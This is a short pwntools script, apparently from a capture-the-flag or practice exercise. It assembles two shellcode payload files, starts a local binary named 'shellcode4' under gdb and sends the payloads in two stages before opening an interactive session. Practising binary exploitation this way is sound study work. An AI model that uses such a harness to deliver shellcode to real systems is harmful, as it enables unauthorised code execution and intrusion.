#!/bin/python

from pwn import *

import os


context.terminal = ['alacritty', '-e', 'sh', '-c']

os.system('nasm payload1.asm')
os.system('nasm payload2.asm')

payload1 = open('payload1', 'rb').read()
payload2 = open('payload2', 'rb').read()

io = gdb.debug('./shellcode4', gdbscript = '''
    b main
    c
        ''')

io.sendline(payload1)
ui.pause()
io.sendline(payload2)

io.interactive()
